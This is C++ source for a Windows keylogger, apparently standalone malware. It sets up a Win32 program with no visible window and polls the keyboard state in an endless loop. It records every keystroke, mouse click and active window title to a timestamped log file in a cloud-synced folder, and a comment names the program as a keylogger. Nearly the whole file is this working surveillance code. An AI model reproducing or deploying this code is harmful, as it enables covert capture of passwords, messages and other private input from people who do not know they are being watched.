#define FILEEXT ".log"

#include <cstdlib>
#include <iostream>
#include <sstream>
#include <fstream>
#include <windows.h>
#include <ctime>
#include <cstring>
using namespace std;

string intToString(int);
string getCurrDir();
string getSelfPath();
string dirBasename(string);


/* This is where all the input to the window goes to */
LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) {
	switch(Message) {
		
		/* Upon destruction, tell the main thread to stop */
		case WM_DESTROY: {
			PostQuitMessage(0);
			break;
		}
		
		/* All other messages (a lot of them) are processed using default procedures */
		default:
			return DefWindowProc(hwnd, Message, wParam, lParam);
	}
	return 0;
}

/* The 'main' function of Win32 GUI programs: this is where execution starts */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	WNDCLASSEX wc; /* A properties struct of our window */
	HWND hwnd; /* A 'HANDLE', hence the H, or a pointer to our window */
	MSG msg; /* A temporary location for all messages */

	/* zero out the struct and set the stuff we want to modify */
	memset(&wc,0,sizeof(wc));
	wc.cbSize		 = sizeof(WNDCLASSEX);
	wc.lpfnWndProc	 = WndProc; /* This is where we will send messages to */
	wc.hInstance	 = hInstance;
	wc.hCursor		 = LoadCursor(NULL, IDC_ARROW);
	
	/* White, COLOR_WINDOW is just a #define for a system color, try Ctrl+Clicking it */
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
	wc.lpszClassName = "WindowClass";
	wc.hIcon		 = LoadIcon(NULL, IDI_APPLICATION); /* Load a standard icon */
	wc.hIconSm		 = LoadIcon(NULL, IDI_APPLICATION); /* use the name "A" to use the project icon */

	if(!RegisterClassEx(&wc)) {
		MessageBox(NULL, "Window Registration Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
		return 0;
	}

	//hwnd = CreateWindowEx(WS_EX_CLIENTEDGE,"WindowClass","Caption",WS_VISIBLE|WS_OVERLAPPEDWINDOW,
	//	CW_USEDEFAULT, /* x */
	//	CW_USEDEFAULT, /* y */
	//	640, /* width */
	//	480, /* height */
	//	NULL,NULL,hInstance,NULL);

//	if(hwnd == NULL) {
//		MessageBox(NULL, "Window Creation Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
//		return 0;
//	}

	/*
		This is the heart of our program where all input is processed and 
		sent to WndProc. Note that GetMessage blocks code flow until it receives something, so
		this loop will not produce unreasonably high CPU usage
	*/
	
	//start
	char filepath[]="C:\\Users\\username\\cloud_account\\";
	time_t rawtime;
	struct tm *timeinfo;
	time(&rawtime);
	timeinfo = localtime(&rawtime);
	char filename[MAX_PATH];
	strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", timeinfo);
	//sprintf(filepath, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);

	//cout << filepath << endl; exit(0);
	strcat(filename, FILEEXT);
	strcat(filepath, filename);
	
	string lastTitle = "";
	ofstream klogout(filepath);

	SHORT lastc = 0;
	while(1){
		Sleep(2); // give other programs time to run

		// get the active windowtitle
		char title[1024];
		HWND hwndHandle = GetForegroundWindow();
		GetWindowText(hwndHandle, title, 1023);
		if(lastTitle != title){
			klogout << endl << endl << "Window: ";
			if(strlen(title) == 0)
				klogout << "NO ACTIVE WINDOW";
			else
				klogout << "'" << title << "'";

			klogout << endl;

			lastTitle = title;
		}

		// logging keys, thats the keylogger
		for(unsigned char c = 1; c < 255; c++){
			SHORT rv = GetAsyncKeyState(c);
			if(rv & 1){ // on press button down
				string out = "";
				if(c == 1)
					out = "[LMOUSE]"; // mouse left
				else if(c == 2)
					out = "[RMOUSE]"; // mouse right
				else if(c == 4)
					out = "[MMOUSE]"; // mouse middle
				else if(c == 13)
					out = "[RETURN]";
				else if(c == 16 || c == 17 || c == 18)
					out = "";
				else if(c == 160 || c == 161) // lastc == 16
					out = "[SHIFT]";
				else if(c == 162 || c == 163) // lastc == 17
					out = "[STRG]";
				else if(c == 164) // lastc == 18
					out = "[ALT]";
				else if(c == 165)
					out = "[ALT GR]";
				else if(c == 8)
					out = "[BACKSPACE]";
				else if(c == 9)
					out = "[TAB]";
				else if(c == 27)
					out = "[ESC]";
				else if(c == 33)
					out = "[PAGE UP]";
				else if(c == 34)
					out = "[PAGE DOWN]";
				else if(c == 35)
					out = "[HOME]";
				else if(c == 36)
					out = "[POS1]";
				else if(c == 37)
					out = "[ARROW LEFT]";
				else if(c == 38)
					out = "[ARROW UP]";
				else if(c == 39)
					out = "[ARROW RIGHT]";
				else if(c == 40)
					out = "[ARROW DOWN]";
				else if(c == 45)
					out = "[INS]";
				else if(c == 46)
					out = "[DEL]";
				else if(c >= 65 && c <= 90 || c >= 48 && c <= 57 || c == 32)
					out = c;

				else if(c == 91 || c == 92)
					out = "[WIN]";
				else if(c >= 96 && c <= 105)
					out = "[NUM " + intToString(c - 96) + "]";
				else if(c == 106)
					out = "[NUM /]";
				else if(c == 107)
					out = "[NUM +]";
				else if(c == 109)
					out = "[NUM -]";
				else if(c == 109)
					out = "[NUM ,]";
				else if(c >= 112 && c <= 123)
					out = "[F" + intToString(c - 111) + "]";
				else if(c == 144)
					out = "[NUM]";
				else if(c == 192)
					out = "[OE]";
				else if(c == 222)
					out = "[AE]";
				else if(c == 186)
					out = "[UE]";
				else if(c == 186)
					out = "+";
				else if(c == 188)
					out = ",";
				else if(c == 189)
					out = "-";
				else if(c == 190)
					out = ".";
				else if(c == 191)
					out = "#";
				else if(c == 226)
					out = "<";

				else
					out = "[KEY \\" + intToString(c) + "]";

				//cout << ">" << out << "< (" << (unsigned)c << ")" << endl;
				klogout << out;
				klogout.flush();

				lastc = c;
			}
		}
	}

	klogout.close();
	//end
	
	while(GetMessage(&msg, NULL, 0, 0) > 0) { /* If no error is received... */
		TranslateMessage(&msg); /* Translate key codes to chars if present */
		DispatchMessage(&msg); /* Send it to WndProc */
	}
	return msg.wParam;
	
	
}


//functions

string intToString(int i){
	stringstream out;
	out << "" << i;
	return out.str();
}

string getCurrDir(){
	string rv = "";

	char *curdir = new char[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, curdir);
	rv = curdir;
	delete[] curdir;

	return rv;
}

string getSelfPath(){
	char selfpath[MAX_PATH];
	GetModuleFileName(NULL, selfpath, MAX_PATH);
	return selfpath;
}

string dirBasename(string path){

	if(path.empty())
		return "";

	if(path.find("\\") == string::npos)
		return path;

	if(path.substr(path.length() - 1) == "\\")
		path = path.substr(0, path.length() - 1);

	size_t pos = path.find_last_of("\\");
	if(pos != string::npos)
		path = path.substr(0, pos);

	if(path.substr(path.length() - 1) == "\\")
		path = path.substr(0, path.length() - 1);

	return path;
}

